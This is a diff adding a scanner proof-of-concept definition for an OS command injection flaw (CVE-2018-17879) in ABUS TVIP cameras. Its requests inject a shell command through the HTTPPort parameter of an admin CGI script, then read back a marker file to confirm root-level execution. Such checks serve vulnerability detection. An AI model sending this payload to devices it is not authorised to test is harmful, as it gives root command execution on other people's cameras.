@@ -1,0 +1,28 @@
+[info]
+id = "POC-AVE-2018-0014"
+name = "ABUS TVIP Camera OS Command Injection PoC"
+author = "AVE"
+severity = "critical"
+tags = ["rce", "cwe-78", "iot"]
+description = "ABUS TVIP系列摄像机CGI脚本的General.Network.UPnP.NATTraversal.HTTPPort参数未经过滤直接传入system()函数，攻击者可注入任意shell命令以root权限执行。通过注入写文件命令创建标记文件后，利用fileread端点读取验证。"
+vuln_id = ["CVE-2018-17879", "AVE-2018-0014"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/admin/param"
+query.action = "update"
+query.General.Network.UPnP.NATTraversal.HTTPPort = "1>/dev/null 2>/dev/null;echo AVE_MARKER_0014>/tmp/ave_p0c_0014;false"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/admin/fileread"
+query.READ.filePath = "/tmp/ave_p0c_0014"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["AVE_MARKER_0014"]
+expect = true
